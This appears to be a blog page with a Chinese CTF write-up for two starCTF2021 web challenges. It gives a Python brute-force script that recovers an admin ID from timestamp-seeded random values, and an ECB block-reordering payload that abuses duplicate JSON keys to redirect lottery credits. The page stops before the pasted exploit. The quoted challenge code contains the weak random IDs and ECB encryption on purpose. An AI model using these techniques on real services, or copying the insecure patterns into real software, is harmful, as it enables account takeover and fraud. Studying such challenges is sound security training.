@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='oh-my-note 考点：时间戳爆破
+题目分析 先给了源码：source.zip
+题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有
+代码审计 打开源码，审计；
+在create_note()函数中，如果用户不存在，就会自动创建
+@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间 random.'><title>starCTF2021复现</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/starctf2021%E5%A4%8D%E7%8E%B0/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='starCTF2021复现'>
+<meta property='og:description' content='oh-my-note 考点：时间戳爆破
+题目分析 先给了源码：source.zip
+题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有
+代码审计 打开源码，审计；
+在create_note()函数中，如果用户不存在，就会自动创建
+@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间 random.'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/starctf2021%E5%A4%8D%E7%8E%B0/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' />
+<meta name="twitter:title" content="starCTF2021复现">
+<meta name="twitter:description" content="oh-my-note 考点：时间戳爆破
+题目分析 先给了源码：source.zip
+题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有
+代码审计 打开源码，审计；
+在create_note()函数中，如果用户不存在，就会自动创建
+@app.route(&amp;#39;/create_note&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;]) def create_note(): try: form = CreateNoteForm() if request.method == &amp;#34;POST&amp;#34;: username = form.username.data title = form.title.data text = form.body.data prv = str(form.private.data) user = User.query.filter_by(username=username).first() if user: user_id = user.user_id else: timestamp = round(time.time(), 4) random.seed(timestamp) user_id = get_random_id() user = User(username=username, user_id=user_id) db.session.add(user) db.session.commit() session[&amp;#39;username&amp;#39;] = username timestamp = round(time.time(), 4) post_at = datetime.datetime.fromtimestamp(timestamp, tz=datetime.timezone.utc).strftime(&amp;#39;%Y-%m-%d%H:%M UTC&amp;#39;) #获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间 random.">
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全和代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <h2 class="article-title">
+        <a href="/p/starctf2021%E5%A4%8D%E7%8E%B0/">starCTF2021复现</a>
+    </h2>
+
+    </div>
+</header>
+
+    <section class="article-content">
+    <h3 id="oh-my-note">oh-my-note</h3>
+<p>考点：时间戳爆破</p>
+<h4 id="题目分析">题目分析</h4>
+<p>先给了源码：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Doh-my-note.zip"  target="_blank" rel="noopener"
+    >source.zip</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144005.png" alt="image-20210118212334753"  /></p>
+<p>题目是一个留言板，发布留言的时候输入用户名可以选择为公开或者私有</p>
+<h4 id="代码审计">代码审计</h4>
+<p>打开源码，审计；</p>
+<p>在<code>create_note()</code>函数中，如果用户不存在，就会自动创建</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/create_note&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">create_note</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">form</span> <span class="o">=</span> <span class="n">CreateNoteForm</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">username</span><span class="o">.</span><span class="n">data</span>
+            <span class="n">title</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">title</span><span class="o">.</span><span class="n">data</span>
+            <span class="n">text</span> <span class="o">=</span> <span class="n">form</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">data</span>
+            <span class="n">prv</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">form</span><span class="o">.</span><span class="n">private</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
+            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>
+
+            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
+                <span class="n">user_id</span> <span class="o">=</span> <span class="n">user</span><span class="o">.</span><span class="n">user_id</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+                <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>
+                <span class="n">user_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+                <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span>
+                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
+                <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+                <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+
+            <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">(),</span> <span class="mi">4</span><span class="p">)</span>
+
+            <span class="n">post_at</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">tz</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">timezone</span><span class="o">.</span><span class="n">utc</span><span class="p">)</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M UTC&#39;</span><span class="p">)</span>
+            <span class="c1">#获取小数点后四位UNIX时间戳对应的Y-M-d H-M时间</span>
+            <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">user_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
+            <span class="n">note_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+
+            <span class="n">note</span> <span class="o">=</span> <span class="n">Note</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">,</span> <span class="n">note_id</span><span class="o">=</span><span class="n">note_id</span><span class="p">,</span>
+                        <span class="n">title</span><span class="o">=</span><span class="n">title</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="n">text</span><span class="p">,</span>
+                        <span class="n">prv</span><span class="o">=</span><span class="n">prv</span><span class="p">,</span> <span class="n">post_at</span><span class="o">=</span><span class="n">post_at</span><span class="p">)</span>
+            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">note</span><span class="p">)</span>
+            <span class="n">db</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;create.html&#34;</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+</code></pre></div><p>其中，我们<code>post_at</code>已经知道</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144023.png" alt="image-20210119142946848"  /></p>
+<p>那么在下面这张图里，我们只有<code>user_id</code>不知道</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144031.png" alt="image-20210119142616697"  /></p>
+<p>而my_note()的else里面只需要<code>user_id</code>就可以列出所有私有note</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/my_notes&#39;</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">my_notes</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">):</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+        <span class="n">user_id</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span><span class="o">.</span><span class="n">user_id</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">user_id</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;user_id&#39;</span><span class="p">)</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">user_id</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;index&#39;</span><span class="p">))</span>
+
+    <span class="n">results</span> <span class="o">=</span> <span class="n">Note</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">user_id</span><span class="o">=</span><span class="n">user_id</span><span class="p">)</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
+    <span class="n">notes</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
+        <span class="n">note</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">note</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">title</span>
+        <span class="n">note</span><span class="p">[</span><span class="s1">&#39;note_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">x</span><span class="o">.</span><span class="n">note_id</span>
+        <span class="n">notes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">note</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;my_notes.html&#34;</span><span class="p">,</span> <span class="n">notes</span><span class="o">=</span><span class="n">notes</span><span class="p">)</span>
+</code></pre></div><p>于是我们可以根据已知的<code>note_id</code>和<code>post_at</code>来<del>反推</del>爆破<code>user_id</code>，只要算出admin的id即可看到发布的私有flag。</p>
+<p>因为时间戳精确到了小数点后四位，我们知道的<code>post_at</code>是分钟级别的，所以这里需要爆破最多<code>10000*60</code>次</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">datetime</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="k">def</span> <span class="nf">get_random_id</span><span class="p">():</span>
+    <span class="n">alphabet</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">alphabet</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
+
+<span class="n">post_at</span> <span class="o">=</span> <span class="s1">&#39;2021-01-15 02:29 UTC&#39;</span><span class="c1">#admin发布的第一个Pubic note时间</span>
+
+<span class="n">l</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span><span class="o">/</span><span class="mi">10000</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)]</span><span class="c1">#小数部分，l是一个列表</span>
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">60</span><span class="p">):</span>
+    <span class="n">ta1</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="s1">&#39;2021-01-15 10:29:{} UTC&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S UTC&#39;</span><span class="p">)</span><span class="c1">#格式化时间，因为时区不同需要加8小时    </span>
+    <span class="n">ta</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">mktime</span><span class="p">(</span><span class="n">ta1</span><span class="p">))</span><span class="c1">#转换为时间戳</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+        <span class="n">t</span> <span class="o">=</span> <span class="n">ta</span> <span class="o">+</span> <span class="n">i</span><span class="c1">#整数部分与小数部分拼接</span>
+        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+        <span class="n">u_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+
+        <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">u_id</span> <span class="o">+</span> <span class="n">post_at</span><span class="p">)</span>
+        <span class="n">p_id</span> <span class="o">=</span> <span class="n">get_random_id</span><span class="p">()</span>
+        <span class="k">if</span> <span class="n">p_id</span> <span class="o">==</span> <span class="s1">&#39;lj40n2p9qj9xkzy3zfzz7pucm6dmjg1u&#39;</span><span class="p">:</span><span class="c1">#admin发布的第一个Pubic note</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">u_id</span><span class="p">)</span>
+            <span class="c1">#算出来admind的userid是7bdeij4oiafjdypqyrl2znwk7w9lulgn</span>
+        
+        <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10000</span> <span class="o">%</span> <span class="mi">8999</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
+</code></pre></div><p>有一个坑，因为时区原因，从获得的时间反推时间戳的时候需要加8个小时</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144048.png" alt="image-20210119143535541"  /></p>
+<p>*ctf{Y0u_Are_t3e_Master_of_3he_Time!}</p>
+<h3 id="lottery-again">lottery again</h3>
+<p>考点：EBC重排攻击，json_decode</p>
+<h4 id="题目分析-1">题目分析</h4>
+<p>题目首先给了源码：<a class="link" href="https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/XCTF-starCTF2021/%5BstarCTF2021%5Dlottery%20again.zip"  target="_blank" rel="noopener"
+    >source.zip</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144055.png" alt="image-20210118172658033"  /></p>
+<p>网站的功能是注册，登陆，buy lottery，每一个用户初始只有300，买一次彩票花100，获得金额是1~100，然而flag需要9999。</p>
+<p>打开源码，审计，主要功能在Http/Controller/LotteryController.php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144108.png" alt="image-20210118184827067"  /></p>
+<p>同时结合抓到的数据包，我们得知运作方式是：</p>
+<pre><code>function buy()(生成一单lottery，返回对称加密后的enc)-&gt;
+function info()(客户端发送enc，服务端对称解密并且jsondecode，返回这单lottery的信息)-&gt;
+function charge()(接收客户端的enc，对称解密并且jsondecode，根据解密得到的user uuid找到用户信息，根据lottery uuid找到lottery信息，把lottery的钱加到user账户)
+</code></pre><p>在<code>function buy()</code>里面有这么几行代码：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$lottery</span> <span class="o">=</span> <span class="nx">Lottery</span><span class="o">::</span><span class="na">create</span><span class="p">([</span><span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="mi">100</span> <span class="o">-</span> <span class="nx">floor</span><span class="p">(</span><span class="nx">sqrt</span><span class="p">(</span><span class="nx">random_int</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)))]);</span>
+<span class="nv">$serilized</span> <span class="o">=</span> <span class="nx">json_encode</span><span class="p">([</span>
+    <span class="s1">&#39;lottery&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
+    <span class="s1">&#39;user&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user</span><span class="o">-&gt;</span><span class="na">uuid</span><span class="p">,</span>
+    <span class="s1">&#39;coin&#39;</span> <span class="o">=&gt;</span> <span class="nv">$lottery</span><span class="o">-&gt;</span><span class="na">coin</span><span class="p">,</span>
+<span class="p">]);</span>
+<span class="nv">$enc</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">mcrypt_encrypt</span><span class="p">(</span><span class="nx">MCRYPT_RIJNDAEL_256</span><span class="p">,</span> <span class="nx">env</span><span class="p">(</span><span class="s1">&#39;LOTTERY_KEY&#39;</span><span class="p">),</span> <span class="nv">$serilized</span><span class="p">,</span> <span class="nx">MCRYPT_MODE_ECB</span><span class="p">));</span>
+</code></pre></div><p>我们可以看到他使用了EBC模式和<code>rijndael256</code>来对<code>enc</code>进行加密；</p>
+<h4 id="ebc加密模式">EBC加密模式</h4>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144116.png" alt="http://p3.qhimg.com/t01b53d433f418eb7da.png"  /></p>
+<blockquote>
+<p>ECB模式是所有模式中最简单的一种。明文分组和密文分组是一一对应的，如果明文分组有相同的那么最后的密文中也会有相同的密文分组。</p>
+<p>因为每个分组都独自进行加密解密，所以无需破解密文就能操纵部分明文，或者改变明文，在不知道加密算法的情况下得到密文，从而达到攻击效果，如图所示（翻转密文分组，那么明文分组也会被翻转）</p>
+</blockquote>
+<h4 id="ecb块重排攻击">ECB块重排攻击</h4>
+<p>前文说过，在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。</p>
+<p>举一个例子，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下：</p>
+<pre><code>admin=0;username=pan
+</code></pre><p>由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中<code>@</code>为填充符号：</p>
+<pre><code>admin=0;
+username
+=pan@@@@
+</code></pre><p>假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为<code>pan@@@@admin=1;</code>，此时明文块的内容如下：</p>
+<pre><code>admin=0;username=pan@@@@admin=1;
+</code></pre><p>我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。</p>
+<h4 id="回到题目">回到题目</h4>
+<p>请求<code>/lottery/buy</code>路由的时候，由于使用的是EBC模式的加密，每一块密文直接与明文对应</p>
+<p>而请求<code>/lottery/charge</code>的时候服务端直接解密我们传过去的enc，根据lottery的uuid和user的uuid来把lottery的金额加入账户余额。</p>
+<p>利用这一点我们便可以注册多个账户，生成多个lottery的uuid并且通过把lottery的uuid拼接到请求<code>/lottery/charge</code>时的enc，来让多个lottery的金额存到同一个user，刷钱。</p>
+<p>本题使用的是<code>MCRYPT_RIJNDAEL_256</code>加密，<code>rijndael128</code>与<code>aes</code>相同，都是以128位为一个块加密，<code>rijndael256</code>则是以256位为一个块，即32字节。</p>
+<p>对于一个enc而言：</p>
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;lottery&#34;</span><span class="p">:</span><span class="s2">&#34;bb9c4db6-d339-4a26-9|397-caeb4bfe043e&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&#34;</span><span class="p">,</span><span class="err">|</span><span class="nt">&#34;coin&#34;</span><span class="p">:</span><span class="mi">6</span><span class="p">}</span><span class="err">@@@@@@@@@@@@@@@@@@@@@@@</span>
+<span class="err">//@是填充</span>
+</code></pre></div><p>可以看到无论我们替换哪一块，都没有办法完全控制user或者lottery，但是我们可以把第一单lottery的1，2块加上第二单lottery的2，3，4块，构成类似于下面的payload：</p>
+<div class="highlight"><pre class="chroma"><code class="language-json" data-lang="json"><span class="p">{</span><span class="nt">&#34;lottery&#34;</span><span class="p">:</span><span class="s2">&#34;1287901b-89d7-4b94-a|0d7-a7655d85800d&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|397-caeb4bfe043e&#34;</span><span class="p">,</span><span class="nt">&#34;user&#34;</span><span class="p">:</span><span class="s2">&#34;157b58|a1-108b-47cc-abf4-fff1f903b05d&#34;</span><span class="p">,</span><span class="err">|</span><span class="nt">&#34;coin&#34;</span><span class="p">:</span><span class="mi">6</span><span class="p">}</span><span class="err">@@@@@@@@@@@@@@@@@@@@@@@</span>
+</code></pre></div><p>前面的user在json_decode之后会被后面的user所覆盖，形成了user不变而lottery任意控制的局面</p>
+<p>贴一个JrXnm师傅的exp：</p>
